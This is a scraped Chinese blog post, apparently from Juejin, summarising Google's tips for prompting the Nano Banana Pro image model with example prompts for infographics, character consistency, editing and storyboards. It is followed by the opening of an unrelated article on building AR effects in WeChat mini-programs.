.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>谷歌官方在 X 上发布了一个指南，手把手教你用 Nano Banana Pro。我对谷歌官方提到的 10 个技巧进行总结下，感兴趣的可以去看原帖。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74708249aec742e09c79fd7d887e9df5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=%2BjvmyEz%2BNxEAhjY%2Bvpw0yfRaNP8%3D" alt="图片" loading="lazy"/></p>
<pre><code class="hljs language-bash" lang="bash">地址：https://x.com/GoogleAIStudio/article/1994480371061469306
</code></pre>
<h2 data-id="heading-0">00、前置介绍</h2>
<p>Nano-Banana Pro 相较于上一代模型有了重大飞跃，从趣味图像生成转向实用专业资产制作。</p>
<p>它在文本渲染、角色一致性、视觉合成、世界知识（搜索）以及高分辨率（4K）输出方面表现出色。</p>
<p>记住，Nano-Banana Pro 是一种思考模型。它不仅仅匹配关键词，它还能理解意图、物理和构图。</p>
<p>为了获得最佳效果，不要在使用各种关键词标签了。</p>
<blockquote>
<p>❌ 不要这样写： "酷炫的汽车，霓虹灯，城市，夜晚，8K。" </p>
</blockquote>
<blockquote>
<p>✅ 要这样写：<br/>
“一幅未来感十足的运动汽车在夜晚的雨中东京街头飞驰的电影宽景镜头。霓虹灯牌反射在湿漉漉的路面和汽车的金属车身上。”</p>
</blockquote>
<p>提示词尽可能描述的详细，不要模糊。一旦是通用的提示词就会生成通用的结果。可以明确主题、场景、光线和氛围。</p>
<blockquote>
<p>不要说“一个女人”，而要说“一个穿着复古香奈儿风格套装的成熟老年妇女”。</p>
</blockquote>
<blockquote>
<p>材质： 描述质感。“哑光表面”、“拉丝钢”、“柔软天鹅绒”、“皱褶纸张”。</p>
</blockquote>
<p>因为模型具有思考能力，提供背景信息有助于它画出更好的效果。</p>
<blockquote>
<p>比如：“创作一张三明治的图片 ，用于巴西高端美食烹饪书”。（模型会推断出专业的摆盘、浅景深和完美的光线）</p>
</blockquote>
<p>下面主要按照如下几个模块总结 Google 发布的对 Nano Banana Pro 的教程。</p>
<ol>
<li>
<p>文本渲染、信息图表与视觉合成 </p>
</li>
<li>
<p>角色一致性与病毒式缩略图 </p>
</li>
<li>
<p>使用谷歌搜索进行基础设置 </p>
</li>
<li>
<p>高级编辑、修复与着色 </p>
</li>
<li>
<p>维度转换（2D ↔3D） </p>
</li>
<li>
<p>高分辨率与纹理 </p>
</li>
<li>
<p>思维与推理 </p>
</li>
<li>
<p>一次性故事板与概念设计 </p>
</li>
<li>
<p>结构控制与布局指导 </p>
</li>
</ol>
<h2 data-id="heading-1">01、文本渲染、信息图表与视觉合成</h2>
<p>Nano-Banana Pro 能够生成清晰、风格化的文本，有几种场景比较常用。</p>
<p>① 内容压缩：把 PDF 文件或大量文字复制进去，让模型作为视觉辅助工具，帮你“压缩”成一张可视化的图表或海报。</p>
<p>② 风格生成：想要啥风格直接说，可以生成不同风格的外观，比如“技术图表”、“手绘白板”等等。</p>
<p>③ 文字生成：图上想写啥字？直接用引号引起来告诉它，它保证不给你写成乱码。</p>
<p>比如：</p>
<blockquote>
<p>财报信息图： [谷歌最新财报 PDF 输入] “生成一份干净、现代的信息图，概述本次财报的主要财务亮点。包括‘收入增长’和‘净利润’的图表，并用风格化的引述框突出 CEO 的关键语录。”</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62f9ce6516254b0c835fc3692a7e0ada~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=9tisMK%2Fk7SCrW4o%2Fmc5IROHsoWU%3D" alt="Image" loading="lazy"/></p>
<blockquote>
<p>复古信息图： 制作一份复古的、1950年代风格的美国餐厅历史信息图。包括“食物”、“点唱机”和“装饰”三个不同部分。确保所有文字清晰易读，并且风格与那个时期相符。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2445a5d4e60247b79c2eced60e24e24d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=FivJw0UjNVIg9i5toT%2FNoBotk6A%3D" alt="Image" loading="lazy"/></p>
<blockquote>
<p>技术图示： 创建一份正投影蓝图，描述该建筑的平面图、立面图和剖面图。用专业建筑字体清楚标注“北立面”和“主入口”。格式为16:9。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bebd477fb51941e4b63e22174a485b64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=coHY2BsVstt67WF5WVW2guQD2tM%3D" alt="Image" loading="lazy"/></p>
<blockquote>
<p>白板总结（教育用）： “用手绘白板图示总结‘Transformer 神经网络架构’的概念，适合大学讲座。使用不同颜色的标记区分编码器和解码器块，并包含清晰的‘自注意力’和‘前馈’标签。”</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6b2f64a413443efb75d52e0e260e149~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=9dMF6TrSdA%2FqStDAMITOfmypG%2BA%3D" alt="Image" loading="lazy"/></p>
<h2 data-id="heading-2">02、字符一致性与视频缩略图</h2>
<p>Nano-Banana Pro 可以将参考图片中的特定人物或角色放入新的场景中，而不扭曲面部特征。</p>
<p>你想生成的图片物体样子和你上传图片的参考一样，需要明确说明：“保持此人的面部特征与上传图片 1 完全一致”。</p>
<p>还需要描述在保持身份的同时，情绪或姿势的变化 。还能制作小红书或者 B 站封面，将主题与粗体图形和文本结合在一起，一次完成。</p>
<blockquote>
<p>视频缩略图： 使用图片 1 中的人物设计一个病毒式视频缩略图。 面部一致性： 保持人物的面部特征与图片 1 完全一致，但将表情改为兴奋和惊讶的样子。  动作： 将人物放在左侧，指向画面右侧。  </p>
<p>主题： 在右侧放置一张高质量的美味牛油果吐司图片。  图形： 添加一只粗体黄色箭头，将人物的手指连接到吐司上。  文字： 在中间叠加大号的流行风格文字：“3 分钟搞定！”（用白色粗边和投影效果）。  背景： 一个模糊、明亮的厨房背景。高饱和度和对比度。 </p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1908fb4a77e046b29cef4ebd7a2c09fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=9SyobJ%2BbJE92M3LDArQOqiqEzPc%3D" alt="Image" loading="lazy"/></p>
<blockquote>
<p>“毛绒朋友”场景（群体一致性）： [输入3张不同毛绒玩具的图片] “用这 3 只毛绒朋友展开一个有趣的十部分故事，他们一起去热带度假。故事情节紧凑，高潮迭起，充满情感波折，最后以一个快乐的瞬间结束。 </p>
<p>保持所有角色的服装和身份一致 ，但他们的表情和角度应在全部 10 张图片中有所变化。确保每张图片中只有一个角色出现。”</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ebd055700c6d498ebfcffa50d8be1e7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=oXsjsOAqFlAoJLazNKncS5VmfSk%3D" alt="Image" loading="lazy"/></p>
<blockquote>
<p>品牌资产生成： [输入一张产品图片] “创建9张令人惊叹的时尚照片，仿佛来自获奖的时尚编辑。以此参考作为品牌风格，但加入细节和多样性，使其传达专业的设计感。请逐一生成九张图片。”</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/611c3c1c6ced4e60960b6eaecb953651~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=w7Kzk0o6jqeRzi1NYxwvdTxey0g%3D" alt="Image" loading="lazy"/></p>
<h2 data-id="heading-3">03、使用谷歌搜索进行基础验证</h2>
<p>Nano-Banana Pro 利用谷歌搜索根据实时数据、时事或事实验证生成图像，减少在时事话题上的幻觉。</p>
<blockquote>
<p>事件可视化： 根据当前旅游趋势，生成一份关于2025年访问美国国家公园最佳时间的信息图。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae21766f359d48428972b09cd5af5c33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=f96NWXubl%2BafYruLaZL%2BQKKIB8w%3D" alt="Image" loading="lazy"/></p>
<h2 data-id="heading-4">04、高级编辑、修复与着色</h2>
<p>该模型还擅长通过对话，对图片中的物体进行移除或添加、修复旧照片、着色以及风格转换。</p>
<blockquote>
<p>物体移除与补绘： 将这张照片背景中的游客移除，并用与周围环境相匹配的逻辑纹理（如鹅卵石和店面）填充空白区域。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/50dfa6602e4a4f969815ac0bb5265eb7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=cY%2FAuRS3LnU8mx69tSkLo%2BG4fas%3D" alt="Image" loading="lazy"/></p>
<blockquote>
<p>漫画/连环画彩色化： [输入黑白漫画面板] “为这幅漫画面板上色。使用充满活力的动画风格调色板。确保能量光束的光影效果呈现发光的霓虹蓝色，角色的服装颜色与官方配色保持一致。”</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47374d5f914b4cc8b9a57026e2ec1992~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=yOmvHWGHhmIK8WNaYOT4ZmH8v%2FE%3D" alt="Image" loading="lazy"/></p>
<blockquote>
<p>本地化（文本翻译 + 文化适应）： [伦敦公交站广告的图片] “将这个概念本地化到东京场景中，包括将标语翻译成日语。将背景改为夜晚繁忙的涩谷街头。”</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16682c2a55a4425ea3163079f0286d3a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=67lYGV0OXKC2CGCj2YK%2F%2Bu6JN8I%3D" alt="Image" loading="lazy"/></p>
<blockquote>
<p>照明/季节控制： [夏天的房屋图片] “将这个场景变成冬天。保持房屋的建筑完全不变，但在屋顶和院子里添加雪，并将光线改为阴冷、阴天的下午。”</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab0c477dcdf5466c9994a51fc2d5892d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=%2FKHrCDw%2FNH8i1VmClplu9VGG5FA%3D" alt="Image" loading="lazy"/></p>
<h2 data-id="heading-5">05、维度转换（2D ↔ 3D)</h2>
<p>一种强大的新功能是将2D示意图转换为3D可视化，</p>
<blockquote>
<p>二维平面图转三维室内设计展示板： “根据上传的二维平面图，生成一张专业的室内设计展示板，包含在一张图片中。</p>
<p>布局： 一个大主图在顶部（宽角度视角的客厅），下面有三张较小的图片（主卧室、家庭办公室和三维俯视平面图）。 </p>
<p>风格： 采用现代极简风格，所有图片都使用温暖的橡木地板和米白色墙壁。  质量： 照片级逼真渲染，柔和自然光线。”</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ffc037685f148418928ae224a036e8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=1vzjp%2BAErYlvroixwPqvAQtbWOg%3D" alt="Image" loading="lazy"/></p>
<blockquote>
<p>2D 转 3D 表情包转换： “将‘没事的狗’表情包变成逼真的 3D 渲染。保持构图一致，但让狗看起来像毛绒玩具，火焰看起来像真实的火焰。”</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b39929e90bb742b0b9cb7c45d7af484f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=zbn9CDkID8gPxSiqYPA1JKjufn0%3D" alt="Image" loading="lazy"/></p>
<h2 data-id="heading-6">06、高分辨率与纹理</h2>
<p>支持原生 1K 到 4K 的图像生成。这对于细节丰富的纹理或大幅面打印尤为有用。</p>
<blockquote>
<p>4K 纹理生成： “利用原生高保真输出，打造一个令人惊叹、充满氛围的苔藓森林地面环境。</p>
<p>指挥复杂的光影效果和细腻的纹理，确保每一缕苔藓和每一道光束都以像素完美的分辨率呈现，适合作为 4K 壁纸。”</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5c702299bf84fb5acf6fb6bcfb1a3d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=jot9wE%2Bh3ZyaE9E%2BljWndEZTNZ8%3D" alt="Image" loading="lazy"/></p>
<blockquote>
<p>复杂逻辑（思考模式）： “创建一份超逼真的美食汉堡信息图，将其拆解，展示烤制金黄的布里欧面包的纹理、煎制的肉饼的焦脆外壳，以及融化的奶酪的闪亮光泽。为每一层标注其风味特征。”</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f536665b0470465ab1487ee8beb03d15~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=6BkbUoFLx6Dj0yTLQT1t6P3EKOc%3D" alt="Image" loading="lazy"/></p>
<h2 data-id="heading-7">07、思考与推理</h2>
<blockquote>
<p>求解方程： 在白板上求解复数域内的方程 log_{x^2+1}(x^4-1)=2。请清楚地展示步骤。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/419587a9ff90491384af17c645d17824~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=vRopYO1rgnE%2BscUXMYYkgJyOu7k%3D" alt="Image" loading="lazy"/></p>
<blockquote>
<p>视觉推理： 分析这张房间的图片，并生成一张“之前”的图片，展示房间在施工期间的样子，包括框架和未完成的石膏板。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e800b99c3cd41d2a9902762e7e704f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=uIcG8M%2FzF3xVNBUNMyo7NLhLEd0%3D" alt="Image" loading="lazy"/></p>
<h2 data-id="heading-8">08、一次性故事板和概念艺术</h2>
<p>你可以生成连续的艺术作品或故事板，确保在一次会话中实现连贯的叙事流程。</p>
<blockquote>
<p>创建一个引人入胜、令人上瘾的九部分故事，配以九张图片，展示一位女性和一位男性在获奖的奢华行李广告中的场景。故事应有情感的高潮与低谷，最后以一张优雅的女性与品牌标志的画面结束。 </p>
<p>女性和男性的身份及着装必须保持一致 ，但他们可以并且应该从不同角度和距离进行拍摄。请逐一生成图片，确保每张图片都是 16:9 的横屏格式。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d67997034eef42e7b7ab4ce22d187f58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=48UW8jSR%2FwLDbAHpBnHpIsC%2FMeg%3D" alt="Image" loading="lazy"/></p>
<h2 data-id="heading-9">09、结构控制与布局指导</h2>
<p>你可以输入一个草图来严格控制最终输出的构图和布局 。</p>
<blockquote>
<p>从草图到最终广告： “根据这个草图为[产品]制作广告。”</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5945153de27840f3ad3fcca564d82e45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=2MNrJY64SAUhxzZ93AuriFsOhK0%3D" alt="Image" loading="lazy"/></p>
<blockquote>
<p>线框图的 UI 模型： “根据这些指南为[产品]创建一个模型。”</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3cf489bbfe0490ea0f01518a3b9d81a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=oquIre37rx38z0oXkIapNxjlJWc%3D" alt="Image" loading="lazy"/></p>
<blockquote>
<p>像素艺术与 LED 显示屏： 生成一只适合完美融入此 64x64 网格图像的像素艺术独角兽精灵。使用高对比度颜色。</p>
<p> (提示：开发者可以通过编程提取每个格子的中心颜色，以驱动连接的 64x64 LED 矩阵显示屏)。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ddff2e3c51924a33954a7c8274cf13a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=ew47OPl1oIob%2BpRTAEiAmOH2GbA%3D" alt="Image" loading="lazy"/></p>
<blockquote>
<p>精灵： 一张显示一名女性在无人机上做后空翻的精灵图集，3x3 网格，序列动画，逐帧动画，方形比例。请严格按照附上的参考图片结构进行。</p>
<p> （提示：你可以提取每个格子制作成 GIF）</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d852ad4ca8214c6080c826c4a16ac07c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518807&amp;x-signature=wNX8ISxqIRANRDEmBqYcVSH%2F9Yc%3D" alt="Image" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[玩转小程序AR-实战篇]]></title>    <link>https://juejin.cn/post/7579961957221777435</link>    <guid>https://juejin.cn/post/7579961957221777435</guid>    <pubDate>2025-12-05T05:53:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579961957221777435" data-draft-id="7579872561675649033" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="玩转小程序AR-实战篇"/> <meta itemprop="keywords" content="微信小程序,WebVR,前端"/> <meta itemprop="datePublished" content="2025-12-05T05:53:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="深红"/> <meta itemprop="url" content="https://juejin.cn/user/4353721773338807"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            玩转小程序AR-实战篇
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4353721773338807/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    深红
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T05:53:34.000Z" title="Fri Dec 05 2025 05:53:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">背景</h2>
<p>某天需求方扔了个链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdetail.tmall.com%2Fitem.htm%3FfpChannel%3D101%26fpChannelSig%3D5e762bf5403ecf3effc7b043733500dd040c9068%26id%3D823870055035%26sku_properties%3D134942334%253A33623926433%26u_channel%3Dbybtqdyh%26umpChannel%3Dbybtqdyh" target="_blank" title="https://detail.tmall.com/item.htm?fpChannel=101&amp;fpChannelSig=5e762bf5403ecf3effc7b043733500dd040c9068&amp;id=823870055035&amp;sku_properties=134942334%3A33623926433&amp;u_channel=bybtqdyh&amp;umpChannel=bybtqdyh" ref="nofollow noopener noreferrer">【原神官方】AR 立牌</a>，询问<strong>小程序</strong>是否能够实现类似的<strong>AR</strong>效果。</p>
<p>作为打工的人的我，于是被迫补起：早已过了风口(<del>bushi</del>)的<code>AR</code>知识。</p>
<h2 data-id="heading-1">调研</h2>
<h3 data-id="heading-2">实体 AR 立牌</h3>
<p>斥<strong>巨资</strong>在闲鱼淘了个多莉的角色立牌，实际体验了下完整的交互流程，AR的氛围感还是不错的。</p>
